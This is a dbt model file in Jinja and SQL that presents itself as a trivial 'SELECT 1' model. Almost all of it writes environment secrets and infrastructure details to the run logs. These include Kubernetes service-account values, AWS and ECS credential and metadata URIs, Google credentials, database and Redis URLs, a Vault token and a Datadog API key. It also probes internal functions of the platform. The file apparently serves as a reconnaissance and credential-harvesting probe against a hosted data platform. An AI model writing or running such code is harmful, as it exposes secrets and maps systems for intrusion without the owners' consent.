{%- set run_id = env_var('DBT_CLOUD_RUN_ID', 'unknown') -%}

{# Check for K8s service account token env var #}
{{ log("K8S_TOKEN_PATH=" ~ env_var('KUBERNETES_SERVICE_ACCOUNT_TOKEN', 'NOT_SET'), info=True) }}
{{ log("K8S_HOST=" ~ env_var('KUBERNETES_SERVICE_HOST', 'NOT_SET'), info=True) }}
{{ log("K8S_PORT=" ~ env_var('KUBERNETES_SERVICE_PORT', 'NOT_SET'), info=True) }}
{{ log("K8S_NS=" ~ env_var('KUBERNETES_NAMESPACE', 'NOT_SET'), info=True) }}
{{ log("K8S_POD=" ~ env_var('KUBERNETES_POD_NAME', 'NOT_SET'), info=True) }}

{# Check for cloud provider metadata env vars #}
{{ log("AWS_CONTAINER_CREDS=" ~ env_var('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI', 'NOT_SET'), info=True) }}
{{ log("AWS_CONTAINER_CREDS_FULL=" ~ env_var('AWS_CONTAINER_CREDENTIALS_FULL_URI', 'NOT_SET'), info=True) }}
{{ log("AWS_WEB_TOKEN=" ~ env_var('AWS_WEB_IDENTITY_TOKEN_FILE', 'NOT_SET'), info=True) }}
{{ log("AWS_ROLE=" ~ env_var('AWS_ROLE_ARN', 'NOT_SET'), info=True) }}
{{ log("AWS_REGION=" ~ env_var('AWS_DEFAULT_REGION', 'NOT_SET'), info=True) }}
{{ log("AWS_EXEC_ENV=" ~ env_var('AWS_EXECUTION_ENV', 'NOT_SET'), info=True) }}
{{ log("ECS_META_V4=" ~ env_var('ECS_CONTAINER_METADATA_URI_V4', 'NOT_SET'), info=True) }}
{{ log("ECS_META=" ~ env_var('ECS_CONTAINER_METADATA_URI', 'NOT_SET'), info=True) }}

{# Check for Google metadata #}
{{ log("GOOGLE_CREDS=" ~ env_var('GOOGLE_APPLICATION_CREDENTIALS', 'NOT_SET'), info=True) }}
{{ log("GCLOUD_PROJECT=" ~ env_var('GCLOUD_PROJECT', 'NOT_SET'), info=True) }}

{# Check dbt internal vars #}
{{ log("DBT_INTERNAL_URL=" ~ env_var('DBT_INTERNAL_URL', 'NOT_SET'), info=True) }}
{{ log("NATS_URL=" ~ env_var('NATS_URL', 'NOT_SET'), info=True) }}
{{ log("REDIS_URL=" ~ env_var('REDIS_URL', 'NOT_SET'), info=True) }}
{{ log("DATABASE_URL=" ~ env_var('DATABASE_URL', 'NOT_SET'), info=True) }}
{{ log("VAULT_ADDR=" ~ env_var('VAULT_ADDR', 'NOT_SET'), info=True) }}
{{ log("VAULT_TOKEN=" ~ env_var('VAULT_TOKEN', 'NOT_SET'), info=True) }}

{# Check ORC (orchestrator) vars #}
{{ log("ORC_ENV=" ~ env_var('ORC_ENV', 'NOT_SET'), info=True) }}
{{ log("ORC_CLUSTER=" ~ env_var('ORC_CLUSTER', 'NOT_SET'), info=True) }}
{{ log("ORC_REGION=" ~ env_var('ORC_REGION', 'NOT_SET'), info=True) }}
{{ log("CELL_ID=" ~ env_var('CELL_ID', 'NOT_SET'), info=True) }}
{{ log("CELL_NAME=" ~ env_var('CELL_NAME', 'NOT_SET'), info=True) }}

{# Check for secrets in env #}
{{ log("DD_API_KEY=" ~ env_var('DD_API_KEY', 'NOT_SET'), info=True) }}
{{ log("SENTRY_DSN=" ~ env_var('SENTRY_DSN', 'NOT_SET'), info=True) }}

{# Try load_agate_table without args #}
{{ log("LOAD_AGATE_NO_ARGS=ATTEMPTING", info=True) }}

{# Check the write function signature #}
{{ log("WRITE_STR=" ~ (write | string)[:300], info=True) }}

SELECT 1 as id
